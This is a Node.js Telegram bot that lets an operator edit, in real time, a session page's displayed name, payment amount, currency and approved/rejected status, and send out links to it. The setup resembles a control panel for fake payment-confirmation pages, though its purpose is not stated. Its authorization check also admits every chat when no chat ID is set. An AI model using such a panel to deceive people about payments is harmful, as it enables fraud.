require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const AUTHORIZED_CHAT_ID = String(process.env.TELEGRAM_CHAT_ID || "").trim();
const LOCAL_PORT = Number(process.env.PORT || 3000);
const DEFAULT_LOCAL_API_URL = `http://127.0.0.1:${LOCAL_PORT}`;
const PUBLIC_API_URL = (process.env.PUBLIC_API_URL || process.env.PUBLIC_BASE_URL || DEFAULT_LOCAL_API_URL).replace(/\/$/, "");
const PUBLIC_WEB_URL = (process.env.PUBLIC_WEB_URL || process.env.PUBLIC_BASE_URL || PUBLIC_API_URL).replace(/\/$/, "");

if (!BOT_TOKEN) {
  console.log("Bot token not configured.");
  module.exports = null;
} else {
  const bot = new TelegramBot(BOT_TOKEN, { polling: true });
  const commandPattern = (name, args = "") => new RegExp(`^\\/${name}(?:@\\w+)?${args}$`, "i");

  function isAuthorized(msg) {
    if (!AUTHORIZED_CHAT_ID) return true;
    return String(msg.chat.id) === AUTHORIZED_CHAT_ID;
  }

  function denyIfUnauthorized(msg) {
    if (isAuthorized(msg)) return false;
    bot.sendMessage(msg.chat.id, "This bot is not authorized for this chat.");
    return true;
  }

  function sendToServer(payload) {
    return fetch(`${PUBLIC_API_URL}/api/demo-event`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).then(async (response) => {
      const text = await response.text();
      let data = {};

      if (text) {
        try {
          data = JSON.parse(text);
        } catch (error) {
          throw new Error(`Server returned invalid JSON (${response.status}).`);
        }
      }

      if (!response.ok) {
        throw new Error(data.message || `Server request failed with ${response.status}.`);
      }

      return data;
    });
  }

  async function resolveTelegramAsset(fileId) {
    const fileResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${encodeURIComponent(fileId)}`);
    const filePayload = await fileResponse.json();

    if (!fileResponse.ok || !filePayload.ok || !filePayload.result?.file_path) {
      throw new Error("Could not resolve Telegram file.");
    }

    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePayload.result.file_path}`;
    const assetResponse = await fetch(fileUrl);
    if (!assetResponse.ok) {
      throw new Error("Could not download Telegram file.");
    }

    const contentType = assetResponse.headers.get("content-type") || "image/jpeg";
    const base64 = Buffer.from(await assetResponse.arrayBuffer()).toString("base64");
    return `data:${contentType};base64,${base64}`;
  }

  bot.onText(commandPattern("start"), (msg) => {
    if (denyIfUnauthorized(msg)) return;

    bot.sendMessage(
      msg.chat.id,
      [
        "Use these commands:",
        "/link <sessionId>",
        "/view <sessionId>",
        "/name <sessionId> <full name>",
        "/username <sessionId> <handle>",
        "/amount <sessionId> <value>",
        "/sign <sessionId> <symbol>",
        "/currency <sessionId> <code>",
        "/loading <sessionId>",
        "/approve <sessionId>",
        "/reject <sessionId>",
        "/reset <sessionId>",
        "/message <sessionId> <text>",
        "/avatar <sessionId> <url>",
        "Send a photo with caption /avatar <sessionId>"
      ].join("\n")
    );
  });

  bot.onText(commandPattern("link", "\\s+([A-Za-z0-9_-]+)"), (msg, match) => {
    if (denyIfUnauthorized(msg)) return;
    const sessionId = match[1];
    bot.sendMessage(msg.chat.id, `${PUBLIC_WEB_URL}/?sessionId=${encodeURIComponent(sessionId)}`);
  });

  bot.onText(commandPattern("view", "\\s+([A-Za-z0-9_-]+)"), async (msg, match) => {
    if (denyIfUnauthorized(msg)) return;
    const sessionId = match[1];

    try {
      const response = await fetch(`${PUBLIC_API_URL}/api/session?sessionId=${encodeURIComponent(sessionId)}`);
      const data = await response.json();
      bot.sendMessage(msg.chat.id, JSON.stringify(data, null, 2));
    } catch (error) {
      bot.sendMessage(msg.chat.id, `Could not load session ${sessionId}: ${error.message}`);
    }
  });

  async function handleUpdate(msg, sessionId, patch, successText) {
    if (denyIfUnauthorized(msg)) return;

    try {
      await sendToServer({ sessionId, ...patch });
      bot.sendMessage(msg.chat.id, successText);
    } catch (error) {
      bot.sendMessage(msg.chat.id, `Update failed: ${error.message}`);
    }
  }

  bot.onText(commandPattern("name", "\\s+([A-Za-z0-9_-]+)\\s+([\\s\\S]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { name: match[2].trim() }, `Name updated for ${match[1]}.`);
  });

  bot.onText(commandPattern("username", "\\s+([A-Za-z0-9_-]+)\\s+(@?[\\w.]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { username: match[2].trim() }, `Username updated for ${match[1]}.`);
  });

  bot.onText(commandPattern("amount", "\\s+([A-Za-z0-9_-]+)\\s+([0-9.,]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { amount: match[2].trim() }, `Amount updated for ${match[1]}.`);
  });

  bot.onText(commandPattern("sign", "\\s+([A-Za-z0-9_-]+)\\s+(\\S+)"), (msg, match) => {
    handleUpdate(msg, match[1], { amountSign: match[2].trim() }, `Amount sign updated for ${match[1]}.`);
  });

  bot.onText(commandPattern("currency", "\\s+([A-Za-z0-9_-]+)\\s+([A-Za-z]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { currency: match[2].trim() }, `Currency updated for ${match[1]}.`);
  });

  bot.onText(commandPattern("loading", "\\s+([A-Za-z0-9_-]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { reviewStatus: "loading" }, `Session ${match[1]} set to loading.`);
  });

  bot.onText(commandPattern("approve", "\\s+([A-Za-z0-9_-]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { reviewStatus: "approved" }, `Session ${match[1]} approved.`);
  });

  bot.onText(commandPattern("reject", "\\s+([A-Za-z0-9_-]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { reviewStatus: "rejected" }, `Session ${match[1]} rejected.`);
  });

  bot.onText(commandPattern("reset", "\\s+([A-Za-z0-9_-]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { reviewStatus: "idle" }, `Session ${match[1]} reset.`);
  });

  bot.onText(commandPattern("message", "\\s+([A-Za-z0-9_-]+)\\s+([\\s\\S]+)"), (msg, match) => {
    handleUpdate(msg, match[1], { referralMessage: match[2].trim() }, `Message updated for ${match[1]}.`);
  });

  bot.onText(commandPattern("avatar", "\\s+([A-Za-z0-9_-]+)\\s+(https?:\\/\\/\\S+)"), (msg, match) => {
    handleUpdate(msg, match[1], { avatarUrl: match[2].trim() }, `Avatar updated for ${match[1]}.`);
  });

  bot.on("photo", async (msg) => {
    if (denyIfUnauthorized(msg)) return;

    const caption = String(msg.caption || "").trim();
    const match = caption.match(commandPattern("avatar", "\\s+([A-Za-z0-9_-]+)"));
    if (!match || !Array.isArray(msg.photo) || !msg.photo.length) return;

    try {
      const fileId = msg.photo[msg.photo.length - 1].file_id;
      const avatarUrl = await resolveTelegramAsset(fileId);
      await handleUpdate(msg, match[1], { avatarUrl }, `Avatar updated for ${match[1]}.`);
    } catch (error) {
      bot.sendMessage(msg.chat.id, `Avatar update failed: ${error.message}`);
    }
  });

  bot.on("document", async (msg) => {
    if (denyIfUnauthorized(msg)) return;

    const caption = String(msg.caption || "").trim();
    const match = caption.match(commandPattern("avatar", "\\s+([A-Za-z0-9_-]+)"));
    if (!match || !msg.document?.file_id || !String(msg.document?.mime_type || "").startsWith("image/")) return;

    try {
      const avatarUrl = await resolveTelegramAsset(msg.document.file_id);
      await handleUpdate(msg, match[1], { avatarUrl }, `Avatar updated for ${match[1]}.`);
    } catch (error) {
      bot.sendMessage(msg.chat.id, `Avatar update failed: ${error.message}`);
    }
  });

  console.log("Bot ready");
  module.exports = bot;
}
